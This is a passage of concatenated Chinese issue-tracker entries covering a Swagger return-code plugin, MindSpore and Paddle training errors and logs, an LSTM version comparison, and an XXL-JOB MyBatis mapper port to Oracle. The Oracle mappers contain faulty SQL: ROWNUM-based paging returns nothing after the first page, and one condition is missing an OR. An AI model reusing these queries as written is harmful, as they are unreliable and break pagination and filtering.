SUCCESS(1, ""操作成功""), USER_PASSWORD_ERROR(2002, ""用户名和密码错误，请重新输入""), USER_LOCKED_ERROR(2003, ""用户已锁定""), } @Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) public @interface ApiCodes { ReturnCode[] value(); } @Component public class ReturnCodePropertyPlugin implements OperationBuilderPlugin { @Override public boolean supports(DocumentationType delimiter) { return true; } @Override public void apply(OperationContext context) { Set&lt;ResponseMessage&gt; responseMessages = CollUtil.newHashSet( new ResponseMessageBuilder() .code(ReturnCode.SUCCESS.getCode()) .message(ReturnCode.SUCCESS.getMsg()) .build(), new ResponseMessageBuilder() .code(ReturnCode.ERROR.getCode()) .message(ReturnCode.ERROR.getMsg()) .build()); List&lt;ApiCodes&gt; annotations = context.findAllAnnotations(ApiCodes.class); if (CollUtil.isNotEmpty(annotations)) { for (ApiCodes apiCodes : annotations) { ReturnCode[] codes = apiCodes.value(); for (ReturnCode r : codes) { responseMessages.add(new ResponseMessageBuilder() .code(r.getCode()) .message(r.getMsg()) .build() ); } } } context.operationBuilder().responseMessages(responseMessages); } }"
前端construct函数添加入参后报错,"需求如下： 希望将optimizer中的global_step变量逐cell传递到conv2d算子的construct函数中作为判断依据。 自写了Model-&gt;TrainOneStepCell-&gt;WithLossCell-&gt;ResNet-&gt;Conv2d各个cell的相关部分函数，目前global_step可以顺利传入到Conv2D算子的construct函数中，但当需要使用该变量作为判断依据时，代码示例如下： def construct(self, inputs): x = inputs[0] global_step = inputs[1] exceed_bound_step = global_step &gt; 25 if exceed_bound_step: input, input_scale = input_batch_quant_function(x) weight, weight_scale = weight_quant_function(self.weight) quant_output = self.conv2d(input, weight) output = weight_scale * quant_output * input_scale output = cast(output, mindspore.float16) else: output = self.conv2d(x, self.weight) 会报如下错误： [CRITICAL] DEVICE(173361,ffff9d79cb20,python):2022-03-15-15:37:26.912.045 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:783] PrintNotMatchMessage] Can not find any available kernel info for: Default/network-QuantTrainOneStepCell/network-WithLossCell/_backbone-ResNet_Quant/conv1-Conv2d_Quant/Switch-op2669. Maybe the operator can not supported on Ascend platform. Traceback (most recent call last): File ""train.py"", line 423, in train_net() File ""/home/b00585163/mindspore_models/resnet18_for_quant_test/scripts/train/src/model_utils/moxing_adapter.py"", line 104, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 415, in train_net sink_size=dataset.get_dataset_size(), dataset_sink_mode=dataset_sink_mode) File ""/usr/local/lib/python3.7/site-packages/mindspore/train/model.py"", line 788, in train sink_size=sink_size) File ""/usr/local/lib/python3.7/site-packages/mindspore/train/model.py"", line 88, in wrapper func(self, *args, **kwargs) File ""/usr/local/lib/python3.7/site-packages/mindspore/train/model.py"", line 554, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/usr/local/lib/python3.7/site-packages/mindspore/train/model.py"", line 622, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/usr/local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 477, in call out = self.compile_and_run(*args) File ""/usr/local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 803, in compile_and_run self.compile(*inputs) File ""/usr/local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 790, in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/usr/local/lib/python3.7/site-packages/mindspore/common/api.py"", line 632, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) RuntimeError: mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:783 PrintNotMatchMessage] Can not find any available kernel info for: Default/network-QuantTrainOneStepCell/network-WithLossCell/_backbone-ResNet_Quant/conv1-Conv2d_Quant/Switch-op2669. Maybe the operator can not supported on Ascend platform. 想请问一下该需求应该如何实现比较好？   <code>: if self.has_bias: output = self.bias_add(output, self.bias) return output"
[ST][MS][NET][wide&deep dynamic shape][910 8p]GetKernelStream]Assign default compute stream for node Default/_backbone-PredictWithSigmoid/TransData-op1929,"wide&amp;deep动态shape在910环境8p训练，训练日志有error日志 / 硬件环境: /device ascend : -- MindSpore version :r1.8 commit_id:d24864dd -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C81/20220415 (/): /mode graph test_ms_model_zoo_wide_deep_criteo_dynamic_shape_train_infer_8p.py get code from models sh run_auto_parallel_train_cluster.sh 网络训练成功，精度达标，训练日志正常 走给白华伟   <code>: [ERROR] DEVICE(115136,fffe999e71e0,python):2022-05-12-08:45:13.840.866 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_device_context.cc:875] GetKernelStream] Assign default compute stream for node Default/network-VirtualDatasetCellTriple/_backbone-NetWithLossClass/network-WideDeepModel/wide_embeddinglookup-EmbeddingLookup/Unique-op1849 [ERROR] DEVICE(115136,fffe991e61e0,python):2022-05-12-08:45:14.173.723 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_device_context.cc:875] GetKernelStream] Assign default compute stream for node Default/network-VirtualDatasetCellTriple/_backbone-NetWithLossClass/network-WideDeepModel/wide_embeddinglookup-EmbeddingLookup/StridedSlice-op1861 [ERROR] DEVICE(115136,fffe989e51e0,python):2022-05-12-08:45:14.174.942 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_device_context.cc:875] GetKernelStream] Assign default compute stream for node Default/network-VirtualDatasetCellTriple/_backbone-NetWithLossClass/network-WideDeepModel/wide_embeddinglookup-EmbeddingLookup/Sub-op1851 [ERROR] DEVICE(115136,fffe999e71e0,python):2022-05-12-08:45:14.175.538 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_device_context.cc:875] GetKernelStream] Assign default compute stream for node Default/network-VirtualDatasetCellTriple/_backbone-NetWithLossClass/network-WideDeepModel/deep_embeddinglookup-EmbeddingLookup/SparseGatherV2-op1914 [ERROR] DEVICE(115136,fffe999e71e0,python):2022-05-12-08:45:14.175.823 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_device_context.cc:875] GetKernelStream] Assign default compute stream for node Default/network-VirtualDatasetCellTriple/_backbone-NetWithLossClass/network-WideDeepModel/wide_embeddinglookup-EmbeddingLookup/ReLU-op1852 [ERROR] DEVICE(115136,fffe991e61e0,python):2022-05-12-08:45:14.176.134 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_device_context.cc:875] GetKernelStream] Assign default compute stream for node Default/network-VirtualDatasetCellTriple/_backbone-NetWithLossClass/network-WideDeepModel/deep_embeddinglookup-EmbeddingLookup/Gather-op1915 [ERROR] DEVICE(115136,fffe999e71e0,python):2022-05-12-08:45:14.176.946 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_device_context.cc:875] GetKernelStream] Assign default compute stream for node Default/network-VirtualDatasetCellTriple/_backbone-NetWithLossClass/network-WideDeepModel/wide_embeddinglookup-EmbeddingLookup/Minimum-op1853 [ERROR] DEVICE(115136,fffe9b7fe1e0,python):2022-05-12-08:45:14.177.160 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_device_context.cc:875] GetKernelStream] Assign default compute stream for node Default/network-VirtualDatasetCellTriple/_backbone-NetWithLossClass/network-WideDeepModel/deep_embeddinglookup-EmbeddingLookup/Reshape-op1872 [ERROR] DEVICE(115136,fffe9b7fe1e0,python):2022-05-12-08:45:14.177.327 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_device_context.cc:875] GetKernelStream] Assign default compute stream for node Default/network-VirtualDatasetCellTriple/_backbone-NetWithLossClass/network-WideDeepModel/wide_embeddinglookup-EmbeddingLookup/SparseGatherV2-op1912 [ERROR] DEVICE(115136,fffe989e51e0,python):2022-05-12-08:45:14.177.711 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_device_context.cc:875] GetKernelStream] Assign default compute stream for node Default/network-VirtualDatasetCellTriple/_backbone-NetWithLossClass/network-WideDeepModel/wide_embeddinglookup-EmbeddingLookup/Equal-op1855 [ERROR] DEVICE(115136,fffe991e61e0,python):2022-05-12-08:45:14.177.942 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_device_context.cc:875] GetKernelStream] Assign default compute stream for node Default/network-VirtualDatasetCellTriple/_backbone-NetWithLossClass/network-WideDeepModel/Mul-op1874"
paddle2.0rc版本支持多输出吗？,"我在前向传播forward()中return一个list可是当list中的tensor有多个时就会报错。 错误信息： D:\Developer\Anaconda\envs\paddle2.0\lib\site-packages\paddle\nn\layer\norm.py:637: UserWarning: When training, we now always track global mean and variance. ""When training, we now always track global mean and variance."") Traceback (most recent call last): File ""D:/Developer/Workplace/Python/project/maritime-situation-awareness-paddle/tools/trainer.py"", line 19, in model.fit(train_dataset, batch_size=1, epochs=10) File ""D:\Developer\Anaconda\envs\paddle2.0\lib\site-packages\paddle\hapi\model.py"", line 1469, in fit logs = self._run_one_epoch(train_loader, cbks, 'train') File ""D:\Developer\Anaconda\envs\paddle2.0\lib\site-packages\paddle\hapi\model.py"", line 1839, in _run_one_epoch data[len(self._inputs):]) File ""D:\Developer\Anaconda\envs\paddle2.0\lib\site-packages\paddle\hapi\model.py"", line 937, in train_batch loss = self._adapter.train_batch(inputs, labels) File ""D:\Developer\Anaconda\envs\paddle2.0\lib\site-packages\paddle\hapi\model.py"", line 654, in train_batch losses = self.model._loss(*(to_list(outputs) + labels)) File ""D:\Developer\Anaconda\envs\paddle2.0\lib\site-packages\paddle\fluid\dygraph\layers.py"", line 829, in call outputs = self.forward(*inputs, **kwargs) TypeError: forward() takes 3 positional arguments but 5 were given W1208 08:49:29.838227 11360 device_context.cc:338] Please NOTE: device: 0, CUDA Capability: 61, Driver API Version: 10.2, Runtime API Version: 10.2 W1208 08:49:29.838227 11360 device_context.cc:346] device: 0, cuDNN Version: 7.6. Process finished with exit code 1 具体模型代码： class MSAHead(paddle.nn.Layer): def init(self): super(MSAHead, self).init() # 装载配置文件 self.config = Config   <code>: # 用于语义分割 self.conv1 = BnReluConv2d(in_channels=4*256, out_channels=self.config.stuff_class_num+1, kernel_size=3, padding=1) # 方案二 沿用语义分割的思路，直接输入预测 self.conv2 = BnReluConv2d(in_channels=4*256, out_channels=self.config.object_class_num+1, kernel_size=3, padding=1) self.conv3 = BnReluConv2d(in_channels=4*256, out_channels=4, kernel_size=3, padding=1) def forward(self, inputs): # inputs: 接受FPN输出的四层特征图 [P2, P3, P4, P5] preds = paddle.concat(inputs, axis=1) w, h = preds.shape[2], preds.shape[3] # 语义分割分支 # 背景类别分类 cls_preds = self.conv1(preds) cls_preds = F.upsample(cls_preds, [w*4, h*4]) # 目标检测分支 # 方案二 # 目标类别分类 det_cls_preds = self.conv2(preds) det_box_preds = self.conv3(preds) return [cls_preds, det_cls_preds, det_box_preds]"
LSTM在1.5和1.8版本上结果不一致,"在ms1.5版本以及ms1.8版本上分别运行lstm会得到不同的结果 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version :1.5.1/1.8.0 -- Python version :3.7.5 -- OS platform and distribution :18.04 -- GCC/Compiler version : 7.5.0 (/): /mode pynative /mode graph from mindspore import Tensor import mindspore.nn as nn import numpy as np import threading, os, math from mindspore.common import set_seed class LSTM(nn.Cell): def init(self, input_size, hidden_size, num_layers=1, has_bias=True, batch_first=False, bidirectional=False, dropout=0.0): super().init() self.lstm = nn.LSTM(input_size=input_size, hidden_size=hidden_size, num_layers=num_layers, has_bias=has_bias, batch_first=batch_first, bidirectional=bidirectional, dropout=dropout) def save_numpy(filename, data): if not isinstance(data, np.ndarray): data = np.array([data]) np.savetxt(filename, data, fmt=""%.8f"") else: if data.size == 1: new_shape = (1,1) else: new_shape = (data.size // data.shape[-1], data.shape[-1]) # np.savetxt(filename, data.reshape(new_shape), fmt=""%.6f"") data_arr = data.reshape(new_shape) if data_arr.dtype == np.float64: np.savetxt(filename, data_arr, fmt=""%.16f"") elif data_arr.dtype == np.float16: # dtype: np.float16 np.savetxt(filename, data_arr, fmt='%.8f') elif data_arr.dtype == np.float32: # dtype: np.float32 np.savetxt(filename, data_arr, fmt='%.8f') else: # dtype: not float np.savetxt(filename, data_arr, fmt=""%.0f"") set_seed(1) input_size = 32 hidden_size = 18 num_layers = 5 has_bias = True batch_first = False dropout = 0.0 bidirectional = False out_data = './out.dat' #hx = Tensor(np.array([[[1.0]]]).astype(np.float32)) #cx = Tensor(np.array([[[1.0]]]).astype(np.float32)) #input_tensor = Tensor(np.array([[[1.0]]]).astype(np.float32)) hx = Tensor(np.random.randn(5,16,18).astype(np.float32)) cx = Tensor(np.random.randn(5,16,18).astype(np.float32)) input_tensor = Tensor(np.random.randn(8,16,32).astype(np.float32)) net = LSTM(input_size=input_size,hidden_size=hidden_size,num_layers=num_layers, has_bias=has_bias,batch_first=batch_first,bidirectional=bidirectional,dropout=dropout) out, (hy, cy) = net(input_tensor, hx, cx) print(out.asnumpy()) save_numpy(out_data, out.asnumpy()) 分别在ms1.5和ms1.8上执行，并比较结果 结果一致 1.8.0   <code>: def construct(self, input, hx, cx): return self.lstm(input, (hx, cx))"
Adding Enforce to platform,"Basically from caffe2::logging.h, but only expose interface.   <code>: PADDLE_ENFORCE"
XXL-JOB 整理Oracle版本(MyBatis-Mapper),"（主要修改分页排序、时间转换TO_CHAR、模糊查询LIKE、ID自增selectKey、部分字段类型转换jdbcType=VARCHAR） 一、XxlJobGroupMapper.xml 二、XxlJobInfoMapper.xml 三、XxlJobLogGlueMapper.xml 四、XxlJobLogMapper.xml 五、XxlJobRegistryMapper.xml   <code>: &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt; &lt;!DOCTYPE mapper PUBLIC ""-//mybatis.org//DTD Mapper 3.0//EN"" ""http://mybatis.org/dtd/mybatis-3-mapper.dtd""&gt; &lt;mapper namespace=""XxlJobGroupMapper""&gt; &lt;resultMap id=""XxlJobGroup"" type=""com.xxl.job.admin.core.model.XxlJobGroup"" &gt; &lt;result column=""id"" property=""id"" /&gt; &lt;result column=""app_name"" property=""appName"" /&gt; &lt;result column=""title"" property=""title"" /&gt; &lt;result column=""group_order"" property=""order"" /&gt; &lt;result column=""address_type"" property=""addressType"" /&gt; &lt;result column=""address_list"" property=""addressList"" /&gt; &lt;/resultMap&gt; &lt;sql id=""Base_Column_List""&gt; t.id, t.app_name, t.title, t.group_order, t.address_type, t.address_list &lt;/sql&gt; &lt;sql id='JOB_KEY_SEQUENCE'&gt;JOB_KEY_SEQUENCE.NEXTVAL&lt;/sql&gt; &lt;select id=""findAll"" resultMap=""XxlJobGroup""&gt; SELECT &lt;include refid=""Base_Column_List"" /&gt; FROM XXL_JOB_QRTZ_TRIGGER_GROUP t ORDER BY t.group_order ASC &lt;/select&gt; &lt;select id=""findByAddressType"" parameterType=""java.lang.Integer"" resultMap=""XxlJobGroup""&gt; SELECT &lt;include refid=""Base_Column_List"" /&gt; FROM XXL_JOB_QRTZ_TRIGGER_GROUP t WHERE t.address_type = #{addressType} ORDER BY t.group_order ASC &lt;/select&gt; &lt;insert id=""save"" parameterType=""com.xxl.job.admin.core.model.XxlJobGroup"" &gt; &lt;selectKey keyProperty=""id"" resultType=""int"" order=""BEFORE""&gt; select &lt;include refid=""JOB_KEY_SEQUENCE"" /&gt; from dual &lt;/selectKey&gt; INSERT INTO XXL_JOB_QRTZ_TRIGGER_GROUP (id, app_name, title, group_order, address_type, address_list) values (#{id}, #{appName}, #{title}, #{order}, #{addressType}, #{addressList}) &lt;/insert&gt; &lt;update id=""update"" parameterType=""com.xxl.job.admin.core.model.XxlJobGroup"" &gt; UPDATE XXL_JOB_QRTZ_TRIGGER_GROUP SET app_name = #{appName,jdbcType=VARCHAR}, title = #{title,jdbcType=VARCHAR}, group_order = #{order}, address_type = #{addressType}, address_list = #{addressList,jdbcType=VARCHAR} WHERE id = #{id} &lt;/update&gt; &lt;delete id=""remove"" parameterType=""java.lang.Integer"" &gt; DELETE FROM XXL_JOB_QRTZ_TRIGGER_GROUP WHERE id = #{id} &lt;/delete&gt; &lt;select id=""load"" parameterType=""java.lang.Integer"" resultMap=""XxlJobGroup""&gt; SELECT &lt;include refid=""Base_Column_List"" /&gt; FROM XXL_JOB_QRTZ_TRIGGER_GROUP t WHERE t.id = #{id} &lt;/select&gt; &lt;/mapper&gt; &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt; &lt;!DOCTYPE mapper PUBLIC ""-//mybatis.org//DTD Mapper 3.0//EN"" ""http://mybatis.org/dtd/mybatis-3-mapper.dtd""&gt; &lt;mapper namespace=""XxlJobInfoMapper""&gt; &lt;resultMap id=""XxlJobInfo"" type=""com.xxl.job.admin.core.model.XxlJobInfo"" &gt; &lt;result column=""id"" property=""id"" /&gt; &lt;result column=""job_group"" property=""jobGroup"" /&gt; &lt;result column=""job_cron"" property=""jobCron"" /&gt; &lt;result column=""job_desc"" property=""jobDesc"" /&gt; &lt;result column=""add_time"" property=""addTime"" /&gt; &lt;result column=""update_time"" property=""updateTime"" /&gt; &lt;result column=""author"" property=""author"" /&gt; &lt;result column=""alarm_email"" property=""alarmEmail"" /&gt; &lt;result column=""executor_route_strategy"" property=""executorRouteStrategy"" /&gt; &lt;result column=""executor_handler"" property=""executorHandler"" /&gt; &lt;result column=""executor_param"" property=""executorParam"" /&gt; &lt;result column=""executor_block_strategy"" property=""executorBlockStrategy"" /&gt; &lt;result column=""executor_fail_strategy"" property=""executorFailStrategy"" /&gt; &lt;result column=""glue_type"" property=""glueType"" /&gt; &lt;result column=""glue_source"" property=""glueSource"" /&gt; &lt;result column=""glue_remark"" property=""glueRemark"" /&gt; &lt;result column=""glue_updatetime"" property=""glueUpdatetime"" /&gt; &lt;result column=""child_jobkey"" property=""childJobKey"" /&gt; &lt;/resultMap&gt; &lt;sql id=""Base_Column_List""&gt; t.id, t.job_group, t.job_cron, t.job_desc, t.add_time, t.update_time, t.author, t.alarm_email, t.executor_route_strategy, t.executor_handler, t.executor_param, t.executor_block_strategy, t.executor_fail_strategy, t.glue_type, t.glue_source, t.glue_remark, t.glue_updatetime, t.child_jobkey &lt;/sql&gt; &lt;sql id='JOB_KEY_SEQUENCE'&gt;JOB_KEY_SEQUENCE.NEXTVAL&lt;/sql&gt; &lt;select id=""pageList"" parameterType=""java.util.HashMap"" resultMap=""XxlJobInfo""&gt; SELECT &lt;include refid=""Base_Column_List"" /&gt; FROM XXL_JOB_QRTZ_TRIGGER_INFO t &lt;trim prefix=""WHERE"" prefixOverrides=""AND | OR"" &gt; &lt;if test=""jobGroup gt 0""&gt; AND t.job_group = #{jobGroup} &lt;/if&gt; &lt;if test=""executorHandler != null and executorHandler != ''""&gt; &lt;!-- AND t.executor_handler like CONCAT(CONCAT('%', #{executorHandler}), '%') --&gt; AND t.executor_handler like &lt;if test=""dbName == 'oracle'""&gt;'%'||#{executorHandler}||'%'&lt;/if&gt; &lt;if test=""dbName == 'mysql'""&gt;CONCAT(CONCAT('%', #{executorHandler}), '%')&lt;/if&gt; &lt;/if&gt; AND ROWNUM BETWEEN #{offset}+1 AND #{offset}+#{pagesize} &lt;/trim&gt; &lt;!-- 适用于Oracle分页查询:1\因为id是主键所有可以ROWNUM与ORDER BY何用，否则需要先ORDER BY 再取ROWNUM;2\ oracle 从1开始 --&gt; ORDER BY id DESC &lt;!-- LIMIT #{offset}, #{pagesize} --&gt; &lt;/select&gt; &lt;select id=""pageListCount"" parameterType=""java.util.HashMap"" resultType=""int""&gt; SELECT count(1) FROM XXL_JOB_QRTZ_TRIGGER_INFO t &lt;trim prefix=""WHERE"" prefixOverrides=""AND | OR"" &gt; &lt;if test=""jobGroup gt 0""&gt; AND t.job_group = #{jobGroup} &lt;/if&gt; &lt;if test=""executorHandler != null and executorHandler != ''""&gt; &lt;!-- AND t.executor_handler like CONCAT(CONCAT('%', #{executorHandler}), '%') --&gt; AND t.executor_handler like &lt;if test=""dbName == 'oracle'""&gt;'%'||#{executorHandler}||'%'&lt;/if&gt; &lt;if test=""dbName == 'mysql'""&gt;CONCAT(CONCAT('%', #{executorHandler}), '%')&lt;/if&gt; &lt;/if&gt; &lt;/trim&gt; &lt;/select&gt; &lt;insert id=""save"" parameterType=""com.xxl.job.admin.core.model.XxlJobInfo"" keyProperty=""id"" &gt; &lt;selectKey keyProperty=""id"" resultType=""int"" order=""BEFORE""&gt; select &lt;include refid=""JOB_KEY_SEQUENCE"" /&gt; from dual &lt;/selectKey&gt; INSERT INTO XXL_JOB_QRTZ_TRIGGER_INFO ( id, job_group, job_cron, job_desc, add_time, update_time, author, alarm_email, executor_route_strategy, executor_handler, executor_param, executor_block_strategy, executor_fail_strategy, glue_type, glue_source, glue_remark, glue_updatetime, child_jobkey ) VALUES ( #{id}, #{jobGroup}, #{jobCron}, #{jobDesc}, sysdate, sysdate, #{author}, #{alarmEmail}, #{executorRouteStrategy}, #{executorHandler}, #{executorParam}, #{executorBlockStrategy}, #{executorFailStrategy}, #{glueType}, #{glueSource}, #{glueRemark}, sysdate, #{childJobKey} ) &lt;!--&lt;selectKey resultType=""java.lang.Integer"" order=""AFTER"" keyProperty=""id""&gt; SELECT LAST_INSERT_ID() /*SELECT @@IDENTITY AS id*/ &lt;/selectKey&gt;--&gt; &lt;/insert&gt; &lt;select id=""loadById"" parameterType=""java.util.HashMap"" resultMap=""XxlJobInfo""&gt; SELECT &lt;include refid=""Base_Column_List"" /&gt; FROM XXL_JOB_QRTZ_TRIGGER_INFO t WHERE t.id = #{id} &lt;/select&gt; &lt;update id=""update"" parameterType=""com.xxl.job.admin.core.model.XxlJobInfo"" &gt; UPDATE XXL_JOB_QRTZ_TRIGGER_INFO SET job_cron = #{jobCron}, job_desc = #{jobDesc}, update_time = sysdate, author = #{author}, alarm_email = #{alarmEmail}, executor_route_strategy = #{executorRouteStrategy}, executor_handler = #{executorHandler}, executor_param = #{executorParam}, executor_block_strategy = #{executorBlockStrategy}, executor_fail_strategy = #{executorFailStrategy}, glue_type = #{glueType}, glue_source = #{glueSource}, glue_remark = #{glueRemark}, glue_updatetime = #{glueUpdatetime}, child_jobkey = #{childJobKey} WHERE id = #{id} &lt;/update&gt; &lt;delete id=""delete"" parameterType=""java.util.HashMap""&gt; DELETE FROM XXL_JOB_QRTZ_TRIGGER_INFO WHERE id = #{id} &lt;/delete&gt; &lt;select id=""getJobsByGroup"" parameterType=""java.util.HashMap"" resultMap=""XxlJobInfo""&gt; SELECT &lt;include refid=""Base_Column_List"" /&gt; FROM XXL_JOB_QRTZ_TRIGGER_INFO t WHERE t.job_group = #{jobGroup} &lt;/select&gt; &lt;select id=""findAllCount"" resultType=""int""&gt; SELECT count(1) FROM XXL_JOB_QRTZ_TRIGGER_INFO &lt;/select&gt; &lt;/mapper&gt; &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt; &lt;!DOCTYPE mapper PUBLIC ""-//mybatis.org//DTD Mapper 3.0//EN"" ""http://mybatis.org/dtd/mybatis-3-mapper.dtd""&gt; &lt;mapper namespace=""XxlJobLogGlueMapper""&gt; &lt;resultMap id=""XxlJobLogGlue"" type=""com.xxl.job.admin.core.model.XxlJobLogGlue"" &gt; &lt;result column=""id"" property=""id"" /&gt; &lt;result column=""job_id"" property=""jobId"" /&gt; &lt;result column=""glue_type"" property=""glueType"" /&gt; &lt;result column=""glue_source"" property=""glueSource"" /&gt; &lt;result column=""glue_remark"" property=""glueRemark"" /&gt; &lt;result column=""add_time"" property=""addTime"" /&gt; &lt;result column=""update_time"" property=""updateTime"" /&gt; &lt;/resultMap&gt; &lt;sql id=""Base_Column_List""&gt; t.id, t.job_id, t.glue_type, t.glue_source, t.glue_remark, t.add_time, t.update_time &lt;/sql&gt; &lt;sql id='JOB_KEY_SEQUENCE'&gt;JOB_KEY_SEQUENCE.NEXTVAL&lt;/sql&gt; &lt;insert id=""save"" parameterType=""com.xxl.job.admin.core.model.XxlJobLogGlue"" keyProperty=""id"" &gt; &lt;selectKey keyProperty=""id"" resultType=""int"" order=""BEFORE""&gt; select &lt;include refid=""JOB_KEY_SEQUENCE"" /&gt; from dual &lt;/selectKey&gt; INSERT INTO XXL_JOB_QRTZ_TRIGGER_LOGGLUE ( id, job_id, glue_type, glue_source, glue_remark, add_time, update_time ) VALUES ( #{id}, #{jobId}, #{glueType}, #{glueSource}, #{glueRemark}, sysdate, sysdate ) &lt;!-- &lt;selectKey resultType=""java.lang.Integer"" order=""AFTER"" keyProperty=""id""&gt; SELECT LAST_INSERT_ID() &lt;/selectKey&gt; --&gt; &lt;/insert&gt; &lt;select id=""findByJobId"" parameterType=""java.lang.Integer"" resultMap=""XxlJobLogGlue""&gt; SELECT &lt;include refid=""Base_Column_List"" /&gt; FROM XXL_JOB_QRTZ_TRIGGER_LOGGLUE t WHERE t.job_id = #{jobId} ORDER BY id DESC &lt;/select&gt; &lt;delete id=""removeOld"" parameterType=""java.util.HashMap"" &gt; DELETE FROM XXL_JOB_QRTZ_TRIGGER_LOGGLUE WHERE id NOT in( SELECT id FROM( SELECT * FROM ( SELECT id FROM XXL_JOB_QRTZ_TRIGGER_LOGGLUE WHERE job_id = #{jobId} ORDER BY update_time desc ) WHERE ROWNUM BETWEEN 1 AND #{limit} &lt;!-- LIMIT 0, #{limit} --&gt; ) t1 ) AND job_id = #{jobId} &lt;/delete&gt; &lt;delete id=""deleteByJobId"" parameterType=""java.lang.Integer"" &gt; DELETE FROM XXL_JOB_QRTZ_TRIGGER_LOGGLUE WHERE job_id = #{jobId} &lt;/delete&gt; &lt;/mapper&gt; &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt; &lt;!DOCTYPE mapper PUBLIC ""-//mybatis.org//DTD Mapper 3.0//EN"" ""http://mybatis.org/dtd/mybatis-3-mapper.dtd""&gt; &lt;mapper namespace=""XxlJobLogMapper""&gt; &lt;resultMap id=""XxlJobLog"" type=""com.xxl.job.admin.core.model.XxlJobLog"" &gt; &lt;result column=""id"" property=""id"" /&gt; &lt;result column=""job_group"" property=""jobGroup"" /&gt; &lt;result column=""job_id"" property=""jobId"" /&gt; &lt;result column=""glue_type"" property=""glueType"" /&gt; &lt;result column=""executor_address"" property=""executorAddress"" /&gt; &lt;result column=""executor_handler"" property=""executorHandler"" /&gt; &lt;result column=""executor_param"" property=""executorParam"" /&gt; &lt;result column=""trigger_time"" property=""triggerTime"" /&gt; &lt;result column=""trigger_code"" property=""triggerCode"" /&gt; &lt;result column=""trigger_msg"" property=""triggerMsg"" /&gt; &lt;result column=""handle_time"" property=""handleTime"" /&gt; &lt;result column=""handle_code"" property=""handleCode"" /&gt; &lt;result column=""handle_msg"" property=""handleMsg"" /&gt; &lt;/resultMap&gt; &lt;sql id=""Base_Column_List""&gt; t.id, t.job_group, t.job_id, t.glue_type, t.executor_address, t.executor_handler, t.executor_param, t.trigger_time, t.trigger_code, t.trigger_msg, t.handle_time, t.handle_code, t.handle_msg &lt;/sql&gt; &lt;sql id='JOB_KEY_SEQUENCE'&gt;JOB_KEY_SEQUENCE.NEXTVAL&lt;/sql&gt; &lt;select id=""pageList"" parameterType=""java.util.HashMap"" resultMap=""XxlJobLog""&gt; SELECT &lt;include refid=""Base_Column_List"" /&gt; FROM XXL_JOB_QRTZ_TRIGGER_LOG t &lt;trim prefix=""WHERE"" prefixOverrides=""AND | OR"" &gt; &lt;if test=""jobGroup != null and jobGroup != ''""&gt; AND t.job_group = #{jobGroup} &lt;/if&gt; &lt;if test=""jobId gt 0""&gt; AND t.job_id = #{jobId} &lt;/if&gt; &lt;if test=""triggerTimeStart != null""&gt; AND t.trigger_time &lt;![CDATA[ &gt;= ]]&gt; #{triggerTimeStart} &lt;/if&gt; &lt;if test=""triggerTimeEnd != null""&gt; AND t.trigger_time &lt;![CDATA[ &lt;= ]]&gt; #{triggerTimeEnd} &lt;/if&gt; &lt;if test=""logStatus == 1"" &gt; AND t.handle_code = 200 &lt;/if&gt; &lt;if test=""logStatus == 2"" &gt; AND ( (t.trigger_code &lt;![CDATA[ &gt; ]]&gt; 0 AND t.trigger_code!=200) (t.handle_code &lt;![CDATA[ &gt; ]]&gt; 0 AND t.handle_code!=200) ) &lt;/if&gt; &lt;if test=""logStatus == 3"" &gt; AND (t.trigger_code = 200 AND t.handle_code=0) &lt;/if&gt; &lt;!-- 适用于Oracle分页查询:1\因为id是主键所有可以ROWNUM与ORDER BY何用，否则需要先ORDER BY 再取ROWNUM;2\ oracle 从1开始 --&gt; AND ROWNUM BETWEEN #{offset}+1 AND #{offset}+#{pagesize} ORDER BY id DESC &lt;/trim&gt; &lt;!-- LIMIT #{offset}, #{pagesize} --&gt; &lt;/select&gt; &lt;select id=""pageListCount"" parameterType=""java.util.HashMap"" resultType=""int""&gt; SELECT count(1) FROM XXL_JOB_QRTZ_TRIGGER_LOG t &lt;trim prefix=""WHERE"" prefixOverrides=""AND | OR"" &gt; &lt;if test=""jobGroup != null and jobGroup != ''""&gt; AND t.job_group = #{jobGroup} &lt;/if&gt; &lt;if test=""jobId gt 0""&gt; AND t.job_id = #{jobId} &lt;/if&gt; &lt;if test=""triggerTimeStart != null""&gt; AND t.trigger_time &lt;![CDATA[ &gt;= ]]&gt; #{triggerTimeStart} &lt;/if&gt; &lt;if test=""triggerTimeEnd != null""&gt; AND t.trigger_time &lt;![CDATA[ &lt;= ]]&gt; #{triggerTimeEnd} &lt;/if&gt; &lt;if test=""logStatus == 1"" &gt; AND t.handle_code = 200 &lt;/if&gt; &lt;if test=""logStatus == 2"" &gt; AND ( (t.trigger_code &lt;![CDATA[ &gt; ]]&gt; 0 AND t.trigger_code!=200) (t.handle_code &lt;![CDATA[ &gt; ]]&gt; 0 AND t.handle_code!=200) ) &lt;/if&gt; &lt;if test=""logStatus == 3"" &gt; AND (t.trigger_code = 200 